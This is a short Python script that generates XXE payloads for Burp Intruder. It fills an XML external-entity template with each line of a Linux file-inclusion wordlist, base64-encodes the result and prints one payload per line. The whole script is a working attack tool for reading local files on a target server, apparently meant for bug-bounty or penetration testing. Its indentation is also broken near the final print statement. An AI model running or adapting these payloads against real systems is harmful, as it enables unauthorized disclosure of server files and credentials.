#!/usr/bin/python3
import os
import base64

#Launch with: 
#python3 ./script.py > b64payloads-for-burp-intruder.txt

#Modify this with the payload
payload = '''<?xml  version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE cwe [
  	<!ELEMENT cwe ANY >
  	<!ENTITY xxe SYSTEM "replaceMe" >]>
		<bugreport>
		<title></title>
	<cwe>\\&xxe;</cwe>
		<cvss></cvss>
		<reward></reward>
		</bugreport>'''

with open('file_inclusion_linux1.txt') as file:
    array = file.readlines()

for val in array:
	val = payload.replace('replaceMe', val.rstrip())
	message_bytes = val.encode('utf-8')
	base64_bytes = base64.b64encode(message_bytes)
	base64_message = base64_bytes.decode('ascii')

  #Prints the b64 encoded payload with the modified area to correspond to each line in the wordlist to stdout
  print("\n"+base64_message)
  
  
